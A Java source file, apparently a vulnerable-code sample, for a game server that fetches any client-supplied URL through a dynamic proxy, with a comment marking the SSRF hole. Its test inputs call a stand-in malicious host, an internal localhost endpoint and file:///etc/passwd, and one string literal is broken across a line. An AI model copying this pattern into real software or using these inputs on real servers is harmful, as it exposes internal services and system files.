import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.logging.Logger;

// 元编程接口定义
interface ResourceLoader {
    String loadResource(String url);
}

// 动态代理工厂
class DynamicResourceLoaderFactory {
    public static ResourceLoader createLoader() {
        return (ResourceLoader) Proxy.newProxyInstance(
            DynamicResourceLoaderFactory.class.getClassLoader(),
            new Class<?>[] { ResourceLoader.class },
            new InvocationHandler() {
                @Override
                public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
                    if (method.getName().equals("loadResource")) {
                        String targetUrl = (String) args[0];
                        HttpClient client = HttpClient.newHttpClient();
                        HttpRequest request = HttpRequest.newBuilder()
                            .uri(URI.create(targetUrl))
                            .build();
                        HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
                        return response.body();
                    }
                    return null;
                }
            }
        );
    }
}

// 游戏服务器核心类
class GameServer {
    private static final Logger logger = Logger.getLogger("GameServer");
    private ResourceLoader loader;

    public GameServer() {
        this.loader = DynamicResourceLoaderFactory.createLoader();
    }

    public String handleClientRequest(String resourceUrl) {
        logger.info("Processing resource request: " + resourceUrl);
        // 漏洞点：直接使用客户端提供的URL参数
        return loader.loadResource(resourceUrl);
    }

    // 模拟游戏资源加载逻辑
    public String loadMapResource(String mapName, String externalSource) {
        // 业务逻辑：组合生成完整URL
        String fullUrl = externalSource + "/maps/" + mapName + ".json";
        return loader.loadResource(fullUrl);
    }
}

// 桌面游戏服务端入口
class GameServerMain {
    public static void main(String[] args) {
        GameServer server = new GameServer();
        
        // 模拟客户端请求
        String[] testRequests = {
            "http://malicious.com/evil_script.js", // 外部恶意资源
            "http://127.0.0.1:8000/internal_data", // 本地敏感接口
            "file:///etc/passwd" // 本地文件访问
        };
        
        for (String request : testRequests) {
            System.out.println("\
[Server Response for " + request + "]:");
            try {
                String result = server.handleClientRequest(request);
                System.out.println(result != null ? result.substring(0, Math.min(100, result.length())) : "No response");
            } catch (Exception e) {
                System.out.println("Error: " + e.getMessage());
            }
        }
    }
}